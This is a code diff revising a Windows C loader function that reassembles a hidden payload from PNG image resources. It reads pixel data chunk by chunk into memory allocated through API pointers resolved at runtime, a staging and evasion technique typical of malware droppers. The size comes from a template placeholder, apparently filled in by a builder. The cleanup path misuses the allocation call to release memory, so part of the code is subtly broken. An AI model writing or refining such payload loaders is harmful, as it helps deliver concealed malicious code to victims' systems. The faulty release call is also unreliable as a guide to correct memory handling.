@@ -1,77 +1,27 @@
+
+#define EMBEDDED_PAYLOAD_SIZE {{ embedded_data_size }}
+
 BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize) {
-    DEBUG_PRINT("LoadData: Attempting to load payload from PNG image chunks...");
+    DEBUG_PRINT("LoadData: Attempting to load exact payload size: %d bytes", EMBEDDED_PAYLOAD_SIZE);
     
-    size_t total_size = 0;
-    PBYTE final_buffer = NULL;
+    // 1. Allocate the exact buffer size.
+    PBYTE final_buffer = (PBYTE)pfnVirtualAlloc(NULL, EMBEDDED_PAYLOAD_SIZE, MEM_COMMIT, PAGE_READWRITE);
+    if (final_buffer == NULL) {
+        DEBUG_PRINT("LoadData: Failed to allocate %d bytes for payload", EMBEDDED_PAYLOAD_SIZE);
+        return FALSE;
+    }
+    
+    size_t total_bytes_needed = EMBEDDED_PAYLOAD_SIZE;
+    size_t current_offset = 0;
     int chunk_count = 0;
     
-    // First pass: count chunks and calculate total size
-    for (int i = 0; ; i++) {
+    for (int i = 0; current_offset < total_bytes_needed; i++) {
         char resource_name[16];
         
-        // Build resource name without sprintf: "im0", "im1", "im2", etc.
-        pfnRtlMoveMemory(resource_name, "im", 2);  // Copy "im" prefix
-        
-        // Convert integer to string manually
-        int num = i;
-        int pos = 2;  // Start after "im"
-        
-        // Handle numbers 0-99 (more than enough for practical chunk counts)
-        if (num >= 100) {
-            // For 100+, use simple approach with modulo
-            num = num % 100;
-        }
-        
-        if (num >= 10) {
-            // Two-digit number
-            resource_name[pos++] = '0' + (num / 10);  // Tens digit
-            resource_name[pos++] = '0' + (num % 10);  // Ones digit
-        } else {
-            // Single-digit number  
-            resource_name[pos++] = '0' + num;
-        }
-        resource_name[pos] = '\0';  // Null terminate
-        
-        HRSRC hRes = pfnFindResourceA(g_hModule, resource_name, RT_RCDATA);
-        if (hRes == NULL) {
-            break;
-        }
-        
-        DWORD resource_size = pfnSizeofResource(g_hModule, hRes);
-        total_size += resource_size;
-        chunk_count++;
-    }
-    
-    if (chunk_count == 0) {
-        DEBUG_PRINT("LoadData: No PNG chunks found");
-        return FALSE;
-    }
-    
-    DEBUG_PRINT("LoadData: Found %d PNG chunks, estimated total size: %zu", chunk_count, total_size);
-    
-    // Allocate buffer using available VirtualAlloc
-    final_buffer = (PBYTE)pfnVirtualAlloc(NULL, total_size, MEM_COMMIT, PAGE_READWRITE);
-    if (final_buffer == NULL) {
-        DEBUG_PRINT("LoadData: Failed to allocate memory for reassembled payload");
-        return FALSE;
-    }
-    
-    size_t current_offset = 0;
-    BOOL success = TRUE;
-    
-    // Second pass: load and decode each PNG chunk
-    for (int i = 0; i < chunk_count; i++) {
-        char resource_name[16];
-        
-        // Build resource name (same logic as above)
         pfnRtlMoveMemory(resource_name, "im", 2);
         int num = i;
         int pos = 2;
-        
-        if (num >= 100) {
-            num = num % 100;
-        }
-        
+        if (num >= 100) num %= 100;
         if (num >= 10) {
             resource_name[pos++] = '0' + (num / 10);
             resource_name[pos++] = '0' + (num % 10);
@@ -79,74 +29,59 @@ BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize) {
             resource_name[pos++] = '0' + num;
         }
         resource_name[pos] = '\0';
-        
+
         HRSRC hRes = pfnFindResourceA(g_hModule, resource_name, RT_RCDATA);
         if (hRes == NULL) {
-            DEBUG_PRINT("LoadData: Failed to find resource %s", resource_name);
-            success = FALSE;
+            DEBUG_PRINT("LoadData: Ran out of chunks at %s. Assembled %zu bytes, expected %zu",
+                resource_name, current_offset, total_bytes_needed);
             break;
         }
         
         HGLOBAL hResLoad = pfnLoadResource(g_hModule, hRes);
-        if (hResLoad == NULL) {
-            DEBUG_PRINT("LoadData: Failed to load resource %s", resource_name);
-            success = FALSE;
-            break;
-        }
-        
         PBYTE png_data = (PBYTE)pfnLockResource(hResLoad);
-        if (png_data == NULL) {
-            DEBUG_PRINT("LoadData: Failed to lock resource %s", resource_name);
-            success = FALSE;
-            break;
-        }
         
-        DWORD png_size = pfnSizeofResource(g_hModule, hRes);
-        if (png_size == 0) {
-            DEBUG_PRINT("LoadData: Resource %s has zero size", resource_name);
-            success = FALSE;
-            break;
+        if (hResLoad == NULL || png_data == NULL) {
+             DEBUG_PRINT("LoadData: Failed to load/lock resource %s", resource_name);
+             break;
         }
-        
-        // Decode PNG from memory - CORRECTED function call
+
         int width, height, color_channels, bit_depth;
         char* pixel_data = rpng_load_image_from_memory((const char*)png_data, &width, &height, &color_channels, &bit_depth);
         
         if (pixel_data == NULL) {
-            DEBUG_PRINT("LoadData: Failed to decode PNG chunk %s", resource_name);
-            success = FALSE;
-            break;
+             DEBUG_PRINT("LoadData: Failed to decode PNG chunk %s", resource_name);
+             break;
         }
         
-        // Calculate actual bytecode bytes (width * height * 4 bytes per pixel)
-        size_t chunk_bytes = width * height * 4;
-        
-        // Check if we have enough space in final buffer
-        if (current_offset + chunk_bytes > total_size) {
-            // Handle the last chunk which might be partially filled
-            chunk_bytes = total_size - current_offset;
+        chunk_count++;
+        size_t chunk_raw_bytes = width * height * 4; // The total data in this PNG's pixels
+        size_t bytes_to_copy = 0;
+        size_t bytes_remaining_in_buffer = total_bytes_needed - current_offset;
+
+        // 3. This logic prevents buffer overflow AND handles padding.
+        if (chunk_raw_bytes > bytes_remaining_in_buffer) {
+            // This is the last chunk. Only copy what we need, ignore padding.
+            bytes_to_copy = bytes_remaining_in_buffer;
+        } else {
+            // This is a full chunk. Copy all of it.
+            bytes_to_copy = chunk_raw_bytes;
         }
+
+        pfnRtlMoveMemory(final_buffer + current_offset, pixel_data, bytes_to_copy);
+        current_offset += bytes_to_copy;
         
-        // Use available RtlMoveMemory for copying
-        pfnRtlMoveMemory(final_buffer + current_offset, pixel_data, chunk_bytes);
-        current_offset += chunk_bytes;
-        
-        // Free the decoded PNG data (using standard free since rpng uses malloc)
         free(pixel_data);
-        
-        DEBUG_PRINT("LoadData: Processed chunk %s (%dx%d, %zu bytes)", 
-                   resource_name, width, height, chunk_bytes);
     }
     
-    if (!success) {
-        DEBUG_PRINT("LoadData: Partial load completed with errors");
+    if (current_offset == total_bytes_needed) {
+        *ppData = final_buffer;
+        *pdwDataSize = (DWORD)total_bytes_needed;
+        DEBUG_PRINT("LoadData: Successfully reassembled %lu bytes from %d chunks",
+            current_offset, chunk_count);
+        return TRUE;
     }
     
-    *ppData = final_buffer;
-    *pdwDataSize = current_offset;
-    
-    DEBUG_PRINT("LoadData: Reassembled %lu bytes from %d PNG chunks", 
-               current_offset, chunk_count);
-    
-    return success;
+    DEBUG_PRINT("LoadData: FAILED. Assembled %lu of %lu bytes", current_offset, total_bytes_needed);
+    pfnVirtualAlloc(final_buffer, 0, MEM_RELEASE, 0); // Free the buffer
+    return FALSE;
 }
